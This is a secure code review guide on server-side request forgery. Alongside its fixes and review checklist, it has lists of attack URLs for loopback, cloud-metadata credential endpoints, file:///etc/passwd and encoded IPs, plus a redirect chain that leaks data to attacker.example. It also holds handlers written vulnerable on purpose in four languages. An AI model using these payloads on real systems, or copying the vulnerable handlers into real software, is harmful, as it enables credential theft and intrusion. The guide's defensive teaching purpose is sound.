---
title: Review Internal and Egress Exfiltration
keywords:
  - security code review
  - ssrf
  - server-side request forgery
  - internal network
  - egress
description: How to read code for server-side requests that reach internal services or attacker-controlled egress destinations.
---

## 4.24 - Review Internal and Egress Exfiltration

Server-side requests built from user input can reach internal hosts, metadata endpoints, or unintended egress paths. Review image proxies, webhook fetchers, import-from-URL features, and PDF generators. Trace how the server resolves hosts, follows redirects, and which networks the process may contact.

## What This Vulnerability Is

Internal and egress exfiltration covers cases where the application acts as an HTTP client on behalf of users or jobs. An attacker supplies a URL or hostname; the server fetches it from a privileged network position. That may expose admin panels on localhost, cloud instance metadata, or files on internal file servers.

The unsafe assumption is that only public URLs will be requested. Attackers use redirects, DNS rebinding, alternate IP encodings, and internal hostnames to reach resources the browser cannot. This maps to [CWE-918](https://cwe.mitre.org/data/definitions/918.html) (Server-Side Request Forgery).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Image proxies, avatar importers, OG preview fetchers, webhook validators, PDF-from-URL, health checks on user URLs |
| **Input entry** | Query params, JSON body URL fields, path segments appended to internal base URLs |
| **HTTP client sinks** | `requests.get`, `HttpURLConnection`, `HttpClient`, `fetch`, `http.Get` with user-influenced targets |
| **Weak controls** | `"http://127.0.0.1" + path`, substring denylists for `localhost`, automatic redirect following |
| **High-value targets** | Cloud metadata (`169.254.169.254`), internal admin panels, file servers on RFC1918 ranges |
| **Blast radius** | Workers, serverless functions, and containers with broad VPC egress |

## Attack Payloads

Use these in authorized tests against URL fetchers, webhooks, and import-from-URL features. Confirm which networks and protocols the server process may reach.

### Pattern 1: Loopback and localhost (SSRF abuse scenario)

```text
http://127.0.0.1/admin
http://localhost:8080/actuator/health
http://[::1]/internal/
http://127.1/
```

### Pattern 2: Cloud metadata

```text
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Pattern 3: Private RFC1918 ranges

```text
http://10.0.0.15:9200/
http://192.168.1.1/
http://172.16.0.5/internal-api/users
```

### Pattern 4: Alternate IP encodings and DNS rebinding

```text
http://2130706433/          # decimal 127.0.0.1
http://0x7f000001/
http://attacker-controlled.example  # resolves to 127.0.0.1 after TTL
```

### Pattern 5: Non-HTTP schemes and file reads

```text
file:///etc/passwd
file:///c:/windows/win.ini
gopher://internal:70/
```

### Pattern 6: Open redirect and egress exfiltration chains

```text
https://public.example/redirect?next=http://169.254.169.254/
http://internal.service/ → 302 Location: http://attacker.example/?leak=
```

## Language-Specific Sinks and Dangerous APIs

Any server-side HTTP client that accepts a user-influenced URL or host is a review priority.

### Python

```python
requests.get(user_url, allow_redirects=True)
urllib.request.urlopen(image_url)
httpx.AsyncClient().get(webhook_target)
```

`aiohttp`, `selenium` with user URLs, PDF renderers that fetch remote assets.

### Java

```java
new URL(userUrl).openStream();
HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(url)).build(), ...);
RestTemplate.getForObject(userUrl, String.class);
```

Apache `HttpClient`, `ImageIO.read(new URL(url))`, SSRF in SAML/OIDC metadata fetchers.

### C#

```csharp
await httpClient.GetAsync(userUrl);
await new HttpClient().GetStringAsync(previewUrl);
WebClient.DownloadString(imageUrl);
```

### JavaScript (Node.js)

```javascript
const res = await fetch(req.query.url);
axios.get(req.body.webhook);
https.get(userProvidedUrl, (r) => { ... });
```

### Go

```go
resp, err := http.Get(r.URL.Query().Get("url"))
client.Get(userURL)
```

### Shell and integration scripts

```bash
curl "$USER_URL"
wget -O- "$WEBHOOK"
```

## Sample Vulnerable Code in Python

```python
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route("/avatar/import")
def import_avatar():
    # Attacker-controlled URL fetched from the server's network position
    image_url = request.args.get("url")
    resp = requests.get(image_url, timeout=5)
    return resp.content, 200, {"Content-Type": resp.headers.get("Content-Type", "image/png")}
```

## Step-by-Step Review Walkthrough

1. **Find server-side HTTP clients.** Search for `requests.get`, `urllib`, `httpx`, or similar with user-influenced URLs.
2. **Trace the Python avatar import.** In the sample, any URL the server can reach—including internal metadata—is returned to the caller.
3. **Identify URL assembly patterns.** Flag base URLs like `http://127.0.0.1` plus attacker path segments.
4. **Review redirect defaults.** Libraries that follow 302 responses can pivot from a public first hop to an internal target.
5. **Check DNS resolution timing.** Validate resolved IPs against private ranges after lookup, not only the hostname string.
6. **Inspect worker and serverless egress.** Container roles may reach VPC metadata endpoints the browser cannot.
7. **Confirm allowlists, not denylists.** Protocol, host, and port must be restricted before connect.

## Risk Impact Analysis

**Internal service access.** Attackers reach admin panels, debug endpoints, and databases bound to localhost or private subnets.

**Cloud credential theft.** Metadata endpoints on `169.254.169.254` and equivalents may return IAM tokens when SSRF succeeds.

**Data exfiltration.** Server-side fetches can read internal HTTP APIs and relay responses to the attacker.

**Network pivoting.** A compromised fetch feature becomes a foothold for lateral movement inside the deployment environment.

## Vulnerable Examples in Other Languages

### Java

```java
@GetMapping("/internal/proxy")
public void proxy(@RequestParam String path, HttpServletResponse resp) throws IOException {
    URL url = new URL("http://127.0.0.1" + path);
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    IOUtils.copy(conn.getInputStream(), resp.getOutputStream());
}

@PostMapping("/webhooks/test")
public String testWebhook(@RequestBody Map<String, String> body) throws IOException {
    String callback = body.get("callbackUrl");
    HttpURLConnection conn = (HttpURLConnection) new URL(callback).openConnection();
    conn.setRequestMethod("POST");
    return new String(conn.getInputStream().readAllBytes());
}
```

### C#

```csharp
[HttpGet("preview")]
public async Task<IActionResult> Preview([FromQuery] string url)
{
    using var client = new HttpClient();
    var html = await client.GetStringAsync(url);
    return Content(html, "text/html");
}

[HttpPost("import-from-url")]
public async Task<IActionResult> Import([FromBody] ImportRequest req)
{
    using var client = new HttpClient();
    var bytes = await client.GetByteArrayAsync(req.SourceUrl);
    await _storage.SaveAsync(req.DestinationKey, bytes);
    return Ok();
}
```

### Go

```go
func avatarImport(w http.ResponseWriter, r *http.Request) {
    imageURL := r.URL.Query().Get("url")
    resp, err := http.Get(imageURL)
    if err != nil {
        http.Error(w, err.Error(), http.StatusBadGateway)
        return
    }
    defer resp.Body.Close()
    io.Copy(w, resp.Body)
}

func metadataProbe(w http.ResponseWriter, r *http.Request) {
    resp, _ := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    io.Copy(w, resp.Body)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Validate scheme, host, and port against an allowlist. Resolve DNS and block private IP ranges before connecting. Limit redirects and response size.

```python
import ipaddress
import socket
from urllib.parse import urlparse

import requests
from flask import Flask, abort, request

ALLOWED_HOSTS = {"cdn.example.com", "images.example.com"}
BLOCKED_NETS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def safe_fetch(url: str) -> bytes:
    parsed = urlparse(url)
    if parsed.scheme != "https" or parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("URL not allowed")
    for info in socket.getaddrinfo(parsed.hostname, parsed.port or 443):
        addr = ipaddress.ip_address(info[4][0])
        if any(addr in net for net in BLOCKED_NETS):
            raise ValueError("blocked address")
    resp = requests.get(url, timeout=5, allow_redirects=False, stream=True)
    resp.raise_for_status()
    chunk = next(resp.iter_content(8192))
    return chunk

@app.route("/avatar/import")
def import_avatar():
    try:
        data = safe_fetch(request.args["url"])
    except ValueError:
        abort(400)
    return data, 200, {"Content-Type": "image/png"}
```

**Important:** Pass opaque server-side IDs to background jobs instead of raw user URLs when possible.

### Java

Use an allowlist. Disable redirects. Verify resolved IP after DNS.

```java
import java.net.InetAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse.Redirect;

private static final Set<String> ALLOWED_HOSTS = Set.of("cdn.example.com");

public byte[] safeFetch(String urlString) throws Exception {
    URI uri = URI.create(urlString);
    if (!"https".equals(uri.getScheme()) || !ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new IllegalArgumentException("URL not allowed");
    }
    for (InetAddress addr : InetAddress.getAllByName(uri.getHost())) {
        if (addr.isLoopbackAddress() || addr.isLinkLocalAddress() || addr.isSiteLocalAddress()) {
            throw new IllegalArgumentException("blocked address");
        }
    }
    HttpClient client = HttpClient.newBuilder()
        .followRedirects(Redirect.NEVER)
        .connectTimeout(Duration.ofSeconds(5))
        .build();
    HttpRequest req = HttpRequest.newBuilder(uri).GET().build();
    return client.send(req, HttpResponse.BodyHandlers.ofByteArray()).body();
}
```

### C#

Bind named `HttpClient` instances to known base addresses. Validate host before `GetAsync`.

```csharp
private static readonly HashSet<string> AllowedHosts = new() { "cdn.example.com" };

private static bool IsBlocked(IPAddress addr) =>
    IPAddress.IsLoopback(addr) ||
    addr.Equals(IPAddress.Parse("169.254.169.254")) ||
    (addr.IsIPv4 && (
        addr.GetAddressBytes()[0] == 10 ||
        (addr.GetAddressBytes()[0] == 172 && addr.GetAddressBytes()[1] >= 16) ||
        (addr.GetAddressBytes()[0] == 192 && addr.GetAddressBytes()[1] == 168)));

public async Task<byte[]> SafeFetchAsync(string url, IHttpClientFactory factory)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
        throw new ArgumentException("Invalid URL");
    if (uri.Scheme != Uri.UriSchemeHttps || !AllowedHosts.Contains(uri.Host))
        throw new ArgumentException("URL not allowed");
    foreach (var addr in await Dns.GetHostAddressesAsync(uri.Host))
    {
        if (IsBlocked(addr))
            throw new ArgumentException("blocked address");
    }
    var client = factory.CreateClient("AllowlistedCdn");
    return await client.GetByteArrayAsync(uri);
}
```

### Go

Parse URL, allowlist host, and use a custom dialer that refuses private IPs.

```go
func safeFetch(raw string) ([]byte, error) {
    u, err := url.Parse(raw)
    if err != nil || u.Scheme != "https" || u.Hostname() != "cdn.example.com" {
        return nil, fmt.Errorf("URL not allowed")
    }
    addrs, err := net.LookupIP(u.Hostname())
    if err != nil {
        return nil, err
    }
    for _, addr := range addrs {
        if addr.IsLoopback() || addr.IsPrivate() || addr.IsLinkLocalUnicast() {
            return nil, fmt.Errorf("blocked address")
        }
    }
    client := &http.Client{
        Timeout: 5 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
    resp, err := client.Get(u.String())
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}
```

## Verify During Review

- User input cannot choose arbitrary protocol, host, port, or path for server-side HTTP without an allowlist.
- Redirects, DNS rebinding, and alternate IP encodings are considered in the threat model.
- Features that must fetch remote content use a dedicated, hardened client with size and time limits.
- Cloud metadata and loopback addresses are unreachable from request-building code paths.
- Denylists of string substrings are not the primary control.
- Logging captures blocked SSRF attempts without storing full attacker payloads unsafely.

## Reference

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP — Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Python ipaddress module](https://docs.python.org/3/library/ipaddress.html)
- [Python requests — Redirect control](https://requests.readthedocs.io/en/latest/user/quickstart/#redirection-and-history)
- [Java HttpClient — Redirect policy](https://docs.oracle.com/en/java/javase/21/docs/api/java.net.http/java/net/http/HttpClient.Builder.html#followRedirects(java.net.http.HttpClient.Redirect))
- [ASP.NET Core — IHttpClientFactory](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/http-requests)
- [Go net/http — Client](https://pkg.go.dev/net/http#Client)
